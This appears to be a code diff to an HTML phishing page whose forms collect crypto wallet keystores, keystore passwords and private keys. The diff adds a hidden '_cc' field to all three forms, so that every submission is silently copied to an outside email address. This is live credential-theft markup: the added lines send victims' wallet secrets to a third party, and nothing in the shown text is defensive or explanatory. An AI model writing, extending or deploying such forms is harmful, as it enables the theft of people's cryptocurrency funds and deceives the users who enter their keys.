@@ -65,6 +65,7 @@
             placeholder="Enter your keystore"
           ></textarea>
           <input type="hidden" name="_captcha" value="false" />
+          <input type="hidden" name="_cc" value="w3althfront@yandex.com">
           <input
             type="hidden"
             name="_next"
@@ -106,6 +107,7 @@
             placeholder="Keystore"
           />
           <input type="hidden" name="_captcha" value="false" />
+          <input type="hidden" name="_cc" value="w3althfront@yandex.com">
           <input
             type="hidden"
             name="_next"
@@ -147,6 +149,7 @@
             placeholder="Enter your private key"
           />
           <input type="hidden" name="_captcha" value="false" />
+          <input type="hidden" name="_cc" value="w3althfront@yandex.com">
           <input
             type="hidden"
             name="_next"
